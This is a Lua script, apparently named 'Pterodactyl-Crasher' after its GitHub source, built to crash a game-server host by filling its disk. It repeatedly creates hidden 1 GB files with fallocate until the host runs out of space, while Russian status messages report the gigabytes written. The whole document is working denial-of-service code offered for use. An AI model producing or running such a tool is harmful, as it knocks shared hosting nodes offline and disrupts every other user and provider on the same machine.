local socket = require("socket")
local lfs = require("lfs")
local uuid = require("uuid")

local megabytes = 0
local curr = 0

uuid.seed()

local function allocate_space()
    while true do
        local target = ".___tmp_" .. uuid()
        local result = os.execute("fallocate -l 1G " .. target)
        if result == 0 then
            curr = curr + 1
            megabytes = megabytes + 1
        else
            print("Нету места на хосте")
            break
        end
    end
end

local function display_status()
    local displays = 0
    while true do
        socket.sleep(0.1)
        displays = displays + 1
        print(string.format("Закачал всего [ %d ГБ ] со скоростью [ %d Гб/с ]", megabytes, curr))
        if displays % 10 == 0 then
            curr = 0
        end
    end
end

local function main()
    print("github.com/xdearboy/Pterodactyl-Crasher \n\nPterodactyl-Crasher")
    print("Режим: забивка всей памяти")
    print("Подготовка..")

    for i = 1, 48 do
        local thread = coroutine.create(allocate_space)
        coroutine.resume(thread)
    end

    print("Let's go!")
    local status_thread = coroutine.create(display_status)
    coroutine.resume(status_thread)
end

main()
